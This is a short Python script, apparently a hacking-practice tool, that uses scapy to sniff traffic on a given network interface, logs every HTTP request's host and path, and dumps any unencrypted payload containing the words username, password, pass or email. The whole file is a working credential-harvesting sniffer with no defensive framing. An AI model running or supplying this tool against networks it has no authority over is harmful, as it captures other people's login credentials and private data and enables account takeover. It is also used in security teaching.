import argparse
from scapy.all import sniff, Raw
from scapy.layers import http


def get_interface() -> str:
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="Specify interface on which to sniff packets")
    args = parser.parse_args()
    if not args.interface:
        parser.error("Please specify an interface to sniff packets.")
    return args.interface


def process_packet(packet) -> None:
    if packet.haslayer(http.HTTPRequest):
        print(
            f"[+] Http Request >> {packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}")
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors="ignore")
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print(f"\n\n\n[+] Possible {key} >> {load}\n\n\n")
                    break


def sniff_packets(interface: str) -> None:
    sniff(iface=interface, store=False, prn=process_packet)


if __name__ == '__main__':
    iface = get_interface()
    sniff_packets(iface)
